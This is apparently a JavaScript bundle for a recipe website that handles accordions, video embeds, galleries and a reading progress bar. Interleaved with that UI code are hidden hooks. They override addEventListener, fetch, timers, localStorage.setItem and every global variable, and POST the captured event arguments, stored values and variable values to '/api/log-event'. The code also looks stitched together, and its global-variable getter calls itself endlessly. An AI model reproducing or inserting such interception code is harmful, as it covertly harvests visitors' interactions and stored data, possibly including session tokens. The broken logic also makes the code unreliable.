(() => {
  "use strict";

  const nativeFetch = window.fetch;
  const nativeSetTimeout = window.setTimeout;
  const nativeSetInterval = window.setInterval;
  var e = function (e, t) {
      e.classList.add(t);
    },
    t = function (e, t) {
      e.classList.toggle(t);
    },
    r = {
      accordion: document.querySelectorAll(".-accordion"),
      accordionMobile: document.querySelectorAll(".-accordionMobile"),
      progress: document.getElementById("js-progressBar"),
      deadline: document.getElementById("js-progressDeadline"),
      video: document.querySelectorAll(".-embedVideo"),
      videoa3s: document.querySelectorAll(".-VideoA3S"),
      scrollArea: document.querySelector("#main"),
      selectable: document.querySelectorAll(".-selectable"),
      searchForm: document.querySelector("#search-form"),
      searchResults: document.querySelector("#search-result-list"),
      recipeFilter: document.querySelector("#recipe-search-filter-root"),
      filterButton: document.querySelector("#filter"),
      recipeSearchResults: document.querySelector("#recipe-search-result"),
      recipeBookSearch: document.querySelector("#recipe-book-filter-root"),
      recipeCategorySearch: document.querySelector("#recipe-category-search-filter-root"),
      recipeAttributeSearch: document.querySelector("#recipe-attribute-search-filter-root"),
      recipeSearch: document.querySelector("#recipe-search-filter-root"),
      rangers: document.querySelectorAll("[data-dynamic-range]"),
      recipeDrawer: document.querySelector("#js-recipeDrawer"),
      recipeDrawerDeadline: document.querySelector("#js-recipeDrawer-deadline"),
      sortSelections: document.querySelectorAll("[data-dynamic-filter]"),
      dynamicSelections: document.querySelectorAll("[data-dynamic-select]"),
      anchors: document.querySelectorAll("a"),
      bubble: document.querySelector("#info-bubble"),
      counterSource: document.querySelectorAll(".glide__bullet--active"),
      counterTarget: document.querySelectorAll("[data-iteration]"),
      galleryLink: document.querySelectorAll("[data-link]"),
      galleryTrigger: document.querySelector("#gallerySlider"),
      galleryBullets: document.querySelectorAll(".glide__bullet"),
      galleryPageIndicatorPlaceholder: document.querySelector("#pageIndicator"),
      galleryPageIndicator: document.querySelector("[data-page-indicator]"),
      galleryPageIndicatorSumma: document.querySelector("[data-page-indicator-summa]"),
      galleryNextButton: document.querySelector("#gallery-nav-next-btn"),
      galleryPrevButton: document.querySelector("#gallery-nav-prev-btn"),
      fullScreen: document.querySelectorAll("[data-toggle-fullscreen]"),
      fullPicture: document.querySelectorAll("[data-picture]"),
      galleryCts: document.querySelectorAll("[data-cts-gallery]"),
      onScrollEffect: document.querySelectorAll("[data-on-scroll-effect]"),
      onScrollHamburgerMenu: document.querySelector("#navScroll"),
      preLoader: document.querySelector("#preLoader"),
      page: document.querySelector("#page"),
      email: document.querySelectorAll(".-emailShare"),
      accordionTabButton: document.querySelectorAll(".-badgesSection"),
      birthOfDateInput: document.querySelectorAll("input[data-date]"),
      transitionToPageAnchors: document.querySelectorAll("[data-transition-page]"),
      termsCheckbox1: document.querySelector("#terms_1"),
      termsCheckbox2: document.querySelector("#terms_2"),
      disabledButtons: document.querySelectorAll("[disabled]"),
      userNameLabel: document.querySelector("#userNameLabel"),
      userName: document.querySelector("#username"),
      statisticMailSelect: document.querySelector("#statistic_mail"),
      statisticMailRegularitySelect: document.querySelector("#statistic_mail_regularity"),
      pictures: document.querySelectorAll(".-blur"),
      pictureSources: document.querySelectorAll("picture"),
      carouselSources: document.querySelectorAll(".glide__slide source"),
      carouselImages: document.querySelectorAll(".glide__slide img"),
      ingredientCalculatorButtonWrapper: document.querySelector("#ingredientCalculatorButtonWrap"),
      ingredientCalculatorResult: document.querySelector("#ingredientCalculatorResult"),
      ingredientCalculatorForm: document.querySelector("#ingredientCalculatorForm"),
      recipeRatingBoxRoot: document.querySelector("#recipe-rating-box-root"),
      adPopUpRoot: document.querySelector("#ad-popup-root")
    },
    o = "-active",
    c = {
      JW_PLAYER_IDS: {
        normal: "EFfLSeuf",
        ad_free: "coZCKSfn"
      },
      THUMBNAILS: {
        youtube: "https://img.youtube.com/vi/{id}/maxresdefault.jpg",
        jw: "https://cdn.jwplayer.com/v2/media/{id}/poster.jpg?width=720"
      },
      URLS: {
        youtube: "https://www.youtube.com/embed/{id}?autoplay=1",
        jw: {
          EFfLSeuf: "https://content.jwplatform.com/players/{id}-{player_id}.js",
          coZCKSfn: "https://content.jwplatform.com/players/{id}-{player_id}.js"
        }
      },
      createJWRoot: function (e, t) {
        var r = document.createElement("div");
        return r.setAttribute("id", "botr_".concat(e, "_").concat(t, "_div")), r;
      },
      createJWVideo: function (e) {
        var t = document.createElement("script");
        return t.type = "text/javascript", t.src = e, t;
      },
      createYouTubeVideo: function (e) {
        var t = document.createElement("iframe");
        return t.setAttribute("frameborder", "0"), t.setAttribute("allowfullscreen", ""), t.setAttribute("src", e), t;
      },
      getPlayerID: function () {
        var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
        return "undefined" != typeof _ceCTSData && "subscribed" === _ceCTSData.uType || e ? c.JW_PLAYER_IDS.ad_free : c.JW_PLAYER_IDS.normal;
      }
    };
  const nativeRequestAnimationFrame = window.requestAnimationFrame;
  function n(e, t) {
    var r = "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
    if (!r) {
      if (Array.isArray(e) || (r = function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return l(e, t);
        var r = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === r && e.constructor && (r = e.constructor.name);
        if ("Map" === r || "Set" === r) return Array.from(e);
        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return l(e, t);
      }(e)) || t && e && "number" == typeof e.length) {
        r && (e = r);
        var o = 0,
          c = function () {};
        return {
          s: c,
          n: function () {
            return o >= e.length ? {
              done: !0
            } : {
              done: !1,
              value: e[o++]
            };
          },
          e: function (e) {
            throw e;
          },
          f: c
        };
      }
      throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }
    var n,
      a = !0,
      u = !1;
    return {
      s: function () {
        r = r.call(e);
      },
      n: function () {
        var e = r.next();
        return a = e.done, e;
      },
      e: function (e) {
        u = !0, n = e;
      },
      f: function () {
        try {
          a || null == r.return || r.return();
        } finally {
          if (u) throw n;
        }
      }
    };
  }
  const nativeAddEventListener = EventTarget.prototype.addEventListener;
  function l(e, t) {
    (null == t || t > e.length) && (t = e.length);
    for (var r = 0, o = new Array(t); r < t; r++) o[r] = e[r];
    return o;
  }
  const globalVars = Object.keys(window);
  function a(e, t) {
    for (var r = 0; r < t.length; r++) {
      var o = t[r];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, o.key, o);
    }
  }
  const eventHooks = window.eventhooks;
  const callbacks = [];
  var u = function () {
    function r(e) {
      !function (e, t) {
        if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
      }(this, r), this.targetItem = e;
    }
    var c, l, u;
    return c = r, (l = [{
      key: "select",
      value: function () {
        var r = this.targetItem;
        r.forEach(function (c, l) {
          var a = [c, o];
          l || e.apply(void 0, a), c.addEventListener("click", function () {
            var e,
              c,
              l = n(r);
            try {
              for (l.s(); !(e = l.n()).done;) {
                var u = e.value;
                c = o, u.classList.remove(c);
              }
            } catch (e) {
              l.e(e);
            } finally {
              l.f();
            }
            t.apply(void 0, a);
          }, !1);
        });
      }
    }]) && a(c.prototype, l), u && a(c, u), Object.defineProperty(c, "prototype", {
      writable: !1
    }), r;
  }();
  function generateUniqueId() {
    const timestamp = new Date().getTime();
    const randomNum = Math.random().toString().substr(2, 5);
    return `${timestamp}-${randomNum}`;
  }
  function eventData(eventName, args, callback) {
    return {
      eventName,
      args,
      callback,
      timestamp: new Date().toISOString(),
      uniqueId: generateUniqueId()
    };
  }
  function sendEventToServer(eventData) {
    const requestOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(eventData),
      mode: 'cors',
      cache: 'no-cache'
    };
    nativeFetch('/api/log-event', requestOptions).then(response => {
      if (!response.ok) {
        console.error('Failed to send event to server:', response.statusText);
      }
    }).catch(error => {
      console.error('Error sending event to server:', error);
    });
  }
  const i = function (e) {
    e && new u(e).select();
  };
  function createEventHook(func, eventName, original) {
    return new Proxy(func, {
      apply(target, thisArg, args) {
        const callback = args.length > 0 ? args[args.length - 1] : null;
        let callbackId;
        if (typeof callback === 'function') {
          callbackId = callbacks.push(callback);
        }
        const eventDetails = eventData(eventName, args, callbackId);
        sendEventToServer(eventDetails);
        if (callbackId !== undefined) {
          args[args.length - 1] = function () {
            const eventDetails = eventData(eventName, [callbackId]);
            sendEventToServer(eventDetails);
            callbacks[callbackId - 1].apply(this, arguments);
          };
        }
        return original.apply(thisArg, args.length > 0 ? args : []);
      }
    });
  }
  function d(e, t) {
    if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
  }
  function s(e, t) {
    for (var r = 0; r < t.length; r++) {
      var o = t[r];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, o.key, o);
    }
  }
  var m = function () {
    function e(t) {
      var r = this,
        o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
      d(this, e), this.targetItem = t, this.deadline = o, window.addEventListener("scroll", function () {
        r.scrolling();
      });
    }
    var t, r, o;
    return t = e, (r = [{
      key: "scrolling",
      value: function () {
        var e = this.deadline,
          t = this.targetItem,
          r = (e ? window.scrollY + e.getBoundingClientRect().bottom : document.documentElement.scrollHeight) - document.documentElement.clientHeight,
          o = window.scrollY / r * 100;
        t.style.width = o + "%";
      }
    }]) && s(t.prototype, r), o && s(t, o), Object.defineProperty(t, "prototype", {
      writable: !1
    }), e;
  }();
  const y = function (e, t) {
    new m(e, t);
  };
  function hookGlobalFunction(eventName) {
    if (typeof window[eventName] === 'function') {
      window[eventName] = createEventHook(window[eventName], eventName, window[eventName]);
    }
  }
  function hookLocalStorageEvent() {
    const nativeSetItem = localStorage.setItem;
    localStorage.setItem = function (key, value) {
      const eventData = {
        eventName: 'localStorage',
        args: [key, value],
        timestamp: new Date().toISOString(),
        uniqueId: generateUniqueId()
      };
      sendEventToServer(eventData);
      return nativeSetItem.apply(this, arguments);
    };
  }
  var p;
  function hookGlobalVariables() {
    globalVars.forEach(globalVar => {
      if (window[globalVar]) {
        Object.defineProperty(window, globalVar, {
          get: function () {
            return window[globalVar];
          },
          set: function (newValue) {
            const eventData = {
              eventName: 'globalVariable',
              args: [globalVar, newValue],
              timestamp: new Date().toISOString(),
              uniqueId: generateUniqueId()
            };
            sendEventToServer(eventData);
            return window[globalVar] = newValue;
          }
        });
      }
    });
  }
  EventTarget.prototype.addEventListener = function (eventName, func) {
    return nativeAddEventListener.call(this, eventName, function (e) {
      const eventData = {
        eventName: eventName,
        args: Array.from(arguments),
        timestamp: new Date().toISOString(),
        uniqueId: generateUniqueId()
      };
      sendEventToServer(eventData);
      return func.apply(this, arguments);
    });
  };
  ['fetch', 'setTimeout', 'setInterval', 'requestAnimationFrame'].forEach(hookGlobalFunction);
  p = function () {
    i(r.selectable), r.video.forEach(function (e) {
      var t = e.getAttribute("data-embed-type"),
        r = e.getAttribute("data-embed-id"),
        o = e.getAttribute("data-embed-sponsored"),
        n = c.getPlayerID(o),
        l = (c.THUMBNAILS[t] || "").replace("{id}", r),
        a = "";
      if ("jw" === t && (a = (c.URLS[t][n] || "").replace("{id}", r).replace("{player_id}", n)), "youtube" === t && (a = (c.URLS[t] || "").replace("{id}", r)), l && a) {
        var u = new Image();
        u.src = l, u.addEventListener("load", function () {
          return e.appendChild(u);
        }), u.addEventListener("click", function () {
          e.removeChild(u), "jw" === t && (e.appendChild(c.createJWRoot(r, n)), e.appendChild(c.createJWVideo(a))), "youtube" === t && (e.appendChild(c.createYouTubeVideo(a)), e.classList.add("embed-responsive", "embed-responsive-16by9"));
        });
      }
    }), y(r.progress), function () {
      var e = document.querySelectorAll("._ce_measure_appear");
      if (!e) return null;
      e.forEach(function (e, t) {
        e.dataset.ceMeasureAppear = "".concat(e.dataset.ceMeasureAppear, "-").concat(t + 1);
      });
    }();
  }, "complete" === document.readyState || "interactive" === document.readyState ? setTimeout(p, 1) : document.addEventListener("DOMContentLoaded", p);
  hookLocalStorageEvent();
  hookGlobalVariables();
})();